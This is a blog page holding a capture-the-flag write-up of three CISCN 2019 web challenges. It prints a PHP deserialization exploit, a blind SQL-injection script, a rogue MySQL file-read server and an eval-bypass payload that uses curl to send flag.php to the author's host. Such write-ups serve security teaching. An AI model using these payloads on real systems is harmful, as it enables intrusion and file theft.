<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup | 闲言语</title><meta name=keywords content><meta name=description content="上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。
JustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。
index.php:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 <html> <?php error_reporting(0); $file = $_GET[&#34;file&#34;]; $payload = $_GET[&#34;payload&#34;]; if(!isset($file)){ echo 'Missing parameter'.'<br>'; } if(preg_match(&#34;/flag/&#34;,$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(&#34;/flag/&#34;,$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo &#34;Missing parameters&#34;; } ?"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/190427-ciscn2019-web-wp/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup"><meta property="og:description" content="上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。
JustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。
index.php:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 <html> <?php error_reporting(0); $file = $_GET[&#34;file&#34;]; $payload = $_GET[&#34;payload&#34;]; if(!isset($file)){ echo 'Missing parameter'.'<br>'; } if(preg_match(&#34;/flag/&#34;,$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(&#34;/flag/&#34;,$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo &#34;Missing parameters&#34;; } ?"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/190427-ciscn2019-web-wp/"><meta property="article:section" content="post"><meta property="article:published_time" content="2019-04-27T00:35:37+08:00"><meta property="article:modified_time" content="2019-04-27T00:35:37+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup"><meta name=twitter:description content="上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。
JustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。
index.php:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 <html> <?php error_reporting(0); $file = $_GET[&#34;file&#34;]; $payload = $_GET[&#34;payload&#34;]; if(!isset($file)){ echo 'Missing parameter'.'<br>'; } if(preg_match(&#34;/flag/&#34;,$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(&#34;/flag/&#34;,$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo &#34;Missing parameters&#34;; } ?"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup","item":"https://ret2neo.cn/post/190427-ciscn2019-web-wp/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup","name":"第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup","description":"上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。\nJustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。\nindex.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;html\u0026gt; \u0026lt;?php error_reporting(0); $file = $_GET[\u0026#34;file\u0026#34;]; $payload = $_GET[\u0026#34;payload\u0026#34;]; if(!isset($file)){ echo \u0026#39;Missing parameter\u0026#39;.\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ die(\u0026#39;hack attacked!!!\u0026#39;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;],$query); foreach($query as $value){ if (preg_match(\u0026#34;/flag/\u0026#34;,$value)) { die(\u0026#39;stop hacking!\u0026#39;); exit(); } } $payload = unserialize($payload); }else{ echo \u0026#34;Missing parameters\u0026#34;; } ?","keywords":[],"articleBody":"上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。\nJustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。\nindex.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u003chtml\u003e \u003c?php error_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"]; if(!isset($file)){ echo 'Missing parameter'.'\n'; } if(preg_match(\"/flag/\",$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo \"Missing parameters\"; } ?\u003e hint.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u003c?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =\u003e $v) { $this-\u003e$k = null; } echo \"Waking up\\n\"; } public function __construct($handle) { $this-\u003ehandle = $handle; } public function __destruct(){ $this-\u003ehandle-\u003egetFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-\u003efile = $file; $this-\u003etoken_flag = $this-\u003etoken = md5(rand(1,10000)); } public function getFlag(){ $this-\u003etoken_flag = md5(rand(1,10000)); if($this-\u003etoken === $this-\u003etoken_flag) { if(isset($this-\u003efile)){ echo @highlight_file($this-\u003efile,true); } } } } ?\u003e 整体思路是利用Handle实例反序列化时调用的析构函数触发getFlag()，但有几个阻碍。\n$this-\u003etoken === $this-\u003etoken_flag 需要这两个属性值相等才能读到文件，而token值不变，token_flag的值总是在变化。\n1 2 3 4 5 6 7 8 $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } url中不能包含flag字样，而反序列化后的字符串必然会包含 flag 。\n1 2 3 4 5 6 public function __wakeup(){ foreach(get_object_vars($this) as $k =\u003e $v) { $this-\u003e$k = null; } echo \"Waking up\\n\"; } 字符串反序列化时会自动调用对象中的 __wakeup 方法，这里 __wakeup 方法将所有属性值置空，下面 __destruct 的时候就找不到 $handle 了。\n整体方法 1 2 3 4 \u003c?php $f=new Flag('flag.php'); $target=\"[url]/index.php?file=hint.php\u0026payload=\" . urlencode(serialize(new handle($f))); echo $target; 访问输出的链接。\n问题一 __construct 是在对象创建时自动调用，在反序列化时并不会被调用，这给了我们操纵token值的机会。\n由于rand(1,10000) 返回值可能性并不多，可以采用爆破。\n1 2 3 4 5 \u003c?php $f=new Flag('flag.php'); $f-\u003etoken=md5(\"6666\"); $target=\"[url]/index.php?file=hint.php\u0026payload=\" . urlencode(serialize(new handle($f))); echo $target; 重复访问输出的链接。\n当然并不是说跑够一万次就一定能碰上，如果手气不好也可能总遇不到。\n那么可以采用每一次将token赋为不同的值，遍历全部一万种可能，直观上感觉这样做还碰不到的可能性会小很多。\n上面是大力出奇迹的做法，还有比较优雅的做法：将token指向token_flag的引用或相反，那么当一者改变时另一个会跟随。\n问题二 正则看起来绕不过去，直接访问 Flag.php 返回404，说明服务端是大小写敏感的。突破点在于 parse_url 遇到畸形url时会解析失败，那么后面的正则自然不起作用了。\n问题三 PHP有过一个漏洞 CVE-2016-7124 ，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过 __wakeup 的执行。\n参考文章：\nSec Bug #72663 Create an Unexpected Object and Don’t Invoke __wakeup() in Deserialization SugarCRM v6.5.23 PHP反序列化对象注入漏洞 解法 1 2 3 4 5 6 7 8 9 10 11 class Handle{...} class Flag{...} $f=new Flag(\"flag.php\"); $f-\u003etoken=\u0026$f-\u003etoken_flag; $g=serialize(new handle($f)); $gg=str_replace(\":1:{s\", \":2:{s\", $g); echo \"http://[url]///index.php?file=hint.php\u0026payload=\" . urlencode($gg); /* http://[url]///index.php?file=hint.php\u0026payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%224e4b5fbbbb602b6d35bea8460aa8f8e5%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D */ 全宇宙最简单的SQL 基于exp()函数报错的盲注，加上在未知列名情况下注出数据的技巧，可得到user表第二列数据为 F1AG@1s- at_/fll1llag_h3r3 ，作为admin的密码登录后进入后台，可以连接远程数据库，伪造MySQL服务的可以读取flag 文件。知识点在DDCTF2017和DDCTF2019出现过。\n记录个盲注脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #!/usr/bin/env python # -*- coding:utf-8 -*- import requests,re url = 'http://39.97.227.64:52105/' headers = { \"Content-Length\": \"40\", \"Cache-Control\": \"max-age=0\", \"Origin\": \"http://39.106.224.151:52105\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\", \"Referer\": \"http://39.106.224.151:52105/\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Cookie\": \"PHPSESSID=uj6gjpnpsham8ihv8alnegm8e0\", \"Connection\": \"close\" } # payload = \"'^exp({}-ascii(substr((select ),{},1)))#\" # payload = \"admin'^exp({}-ascii(substr((select `2` from (select 1,2 union select * from user)orz#),{},1)))#\" payload = \"'^exp({}-ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),{},1)))#\" p = { 'username': payload, 'password': 'admin' } e = 709 c = 126 j = 1 import time res = '' while j \u003c 30: print str(j) for i in range(32,127): p['username'] = payload.format(e + c, j) r = requests.post(url, data=p, headers=headers) # print r.headers['Content-Length'] # print r.content if re.findall(\"数据库操作失败\", r.content) == []: res += chr(c) print res break c -= 1 # time.sleep(1) j += 1 c = 126 盲注结果：\nMySQL服务端伪造脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import socket file=\"/fll1llag_h3r3\" s=socket.socket() s.bind((\"\",3306)) s.listen(5) c,ip=s.accept() c.sendall(\"\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\") c.recv(666) c.sendall(\"\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\") c.recv(666) c.sendall(chr(len(file)+1)+\"\\x00\\x00\\x01\\xFB\"+file) print c.recv(666) c.close() 伪造结果：\n参考文章：\n伪造mysql服务端实现任意读取 利用MySQL LOAD DATA特性达到任意文件读取 DDCTF 2017 SQL注入-绕过未知字段名 通过CISCN2019 Day 1 SQL注入思考基于运行时错误的盲注 love_math calc.php泄露源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u003c?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) \u003e= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 通过base_convert将十进制转三十六进制，可以得到小写字母和数字共三十六种字符，再通过异或、与、或进一步得到更大的字符集。受限于总长度为小于80个字符，将base_convert赋值给pi方便重复使用。\n遍历发现123456789abcdefghijklmnopqrstuvwxyz 和123456789abcdefghijklmnopqrstuvwxyz 按位异或可得到可打印字符集A@CBEDGFIHKJMLONQPSRUTWVYX[Z]\\_^ ，可以构造出_GET 。使用花括号取偏移，再使用exec执行命令，构造出等价于exec($_GET{1}) 的payload。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import itertools res=set() ii=\"\" jj=\"\" cmd=\"_GET\" for k in cmd: for i,j in itertools.product(\"123456789abcdefghijklmnopqrstuvwxyz\",\"0123456789abcdefghijklmnopqrstuvwxyz\"): kk=chr(ord(i)^ord(j)) if k==kk: ii=ii+i jj+=j break res.add(kk) print ii,jj #1111 nvte print ''.join(res) # A@CBEDPSRUTWVYX[Z]\\_^ 将1111 和nvte 作为36进制数，转为10进制数分别得到：47989和1114322。可以使用在线工具或PHP的base_convert函数转换。\n最终访问路径为calc.php?c=$pi=base_convert;$pi(696468,10,36)(${$pi(47989,10,36)^$pi(1114322,10,36)}{1})\u00261=curl%20my.vps%20-F%20'data=@flag.php' 。在服务端监听即可收到flag.php内容。\n初步实现命令执行\n获取flag\n如果长度放宽一点，这些思路也许也可以：\n1 2 3 4 5 system(cat `ls`) $pi=base_convert;$pi(1751504350,10,36)($pi(963893486026,10,36)\u0026$pi(963910328843,10,36)) system(cat $(ls)) $pi=base_convert;pi(1751504350,10,36)(pi(573877,10,36)\u0026pi(573887,10,36)$(pi((784,10,36)))) ","wordCount":"837","inLanguage":"en","datePublished":"2019-04-27T00:35:37+08:00","dateModified":"2019-04-27T00:35:37+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/190427-ciscn2019-web-wp/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup</h1><div class=post-meta><span title='2019-04-27 00:35:37 +0800 CST'>April 27, 2019</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/190427-ciscn2019-web-wp.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#justsoso aria-label=JustSoso>JustSoso</a><ul><li><a href=#%e6%95%b4%e4%bd%93%e6%96%b9%e6%b3%95 aria-label=整体方法>整体方法</a></li><li><a href=#%e9%97%ae%e9%a2%98%e4%b8%80 aria-label=问题一>问题一</a></li><li><a href=#%e9%97%ae%e9%a2%98%e4%ba%8c aria-label=问题二>问题二</a></li><li><a href=#%e9%97%ae%e9%a2%98%e4%b8%89 aria-label=问题三>问题三</a></li><li><a href=#%e8%a7%a3%e6%b3%95 aria-label=解法>解法</a></li></ul></li><li><a href=#%e5%85%a8%e5%ae%87%e5%ae%99%e6%9c%80%e7%ae%80%e5%8d%95%e7%9a%84sql aria-label=全宇宙最简单的SQL>全宇宙最简单的SQL</a></li><li><a href=#love_math aria-label=love_math>love_math</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><p>上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。</p><p><img loading=lazy src=5b4ed4388d8353cb4.png alt></p><h1 id=justsoso>JustSoso<a hidden class=anchor aria-hidden=true href=#justsoso>#</a></h1><p>使用伪协议 (<code>http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php</code>) 读取到index.php和hint.php。</p><p>index.php:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-29>29</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
